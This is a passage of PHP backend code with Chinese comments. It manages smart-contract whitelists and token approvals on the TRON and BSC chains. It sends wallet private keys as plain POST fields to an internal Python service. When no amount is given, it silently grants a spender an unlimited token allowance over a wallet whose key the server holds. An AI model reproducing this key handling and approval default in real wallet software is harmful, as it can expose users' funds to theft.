                $contract_owner = config('conf.approve_trx_contract_user');
                $contract_owner_private_key = config('conf.approve_trx_contract_user_private_key');
                $contract_owner = new \Tron\Address($contract_owner,$contract_owner_private_key,$trc20Wallet->tron->address2HexString($contract_owner));
                $user_account = new \Tron\Address($user_account,'',$trc20Wallet->tron->address2HexString($user_account));
                $result = $trc20Wallet->removewhiteaccount($contract_owner,$user_account);
                return $result;
            case 2://bsc链
                $url = config('conf.python_ip').'/remove_white_account';
                $contract_owner = config('conf.approve_bsc_contract_user');
                $contract_owner_private_key = config('conf.approve_bsc_contract_user_private_key');
                $data = [
                    'contract' => config('conf.approve_bsc_address'),//合约地址
                    'contract_owner' => $contract_owner,//合约发布者或者管理员钱包地址
                    'private_key' => $contract_owner_private_key,
                    'address' =>  $user_account,//要设置白名单的地址
                ];
                $res = http($url,$data,'POST',[],[],[],5);
                return json_decode($res,true);
        }
    }

    /* 查询是否是智能合约的白名单 */
    public function is_white_account($type,$user_account){
        switch ($type){
            case 1://trc链
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => config('conf.approve_trx_address'),//合约地址
                    'decimals' => 6,
                ];
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $user_account = new \Tron\Address($user_account,'',$trc20Wallet->tron->address2HexString($user_account));
                $result = $trc20Wallet->iswhiteaccount($user_account);
                return $result;
            case 2://bsc链
                $url = config('conf.python_ip').'/is_white_account';
                $data = [
                    'contract' => config('conf.approve_bsc_address'),//合约地址
                    'address' =>  $user_account,//要查询白名单的地址
                ];
                $res = http($url,$data,'POST',[],[],[],5);
                $res_arr = json_decode($res,true);
                return $res_arr['is_white_account'];
        }
    }

    /**
     * 授权某一个币给spender
     * $token 币的合约
     * $token_decimals 币的精度
     * $amount 授权数量
     * $from 要授权的账号
     * $spender 授权给的地址
     */
    public function add_approve_account($type,$from,$from_private_key,$spender,$amount,$token,$token_decimals){
        switch ($type){
            case 1://trc链
                $uri = 'https://api.trongrid.io';
                $api = new \Tron\Api(new \GuzzleHttp\Client(['base_uri' => $uri]));
                $config = [
                    'contract_address' => $token,//调用USDT合约地址
                    'decimals' => $token_decimals,
                ];
                if($amount <= 0){
                    $amount = 99999999;
                }
                $trc20Wallet = new \Tron\TRC20($api, $config);
                $from = new \Tron\Address($from,$from_private_key,$trc20Wallet->tron->address2HexString($from));
                $spender = new \Tron\Address($spender,'',$trc20Wallet->tron->address2HexString($spender));
                $result = $trc20Wallet->addapproveaccount($from,$spender,$amount);
                return $result;
            case 2://bsc链
                $url = config('conf.python_ip').'/add_approve_account';
                if($amount <= 0){
                    $amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                }
                $data = [
                    'token' => $token,//币的合约
                    'token_decimals' => $token_decimals,
                    'from' => $from,//合约发布者或者管理员钱包地址
                    'from_private_key' => $from_private_key,
                    'spender' =>  $spender,
                    'amount' =>  $amount,
                    'chain_id' =>  56,
                ];
                $res = http($url,$data,'POST',[],[],[],5);
                return json_decode($res,true);
        }
    }



}
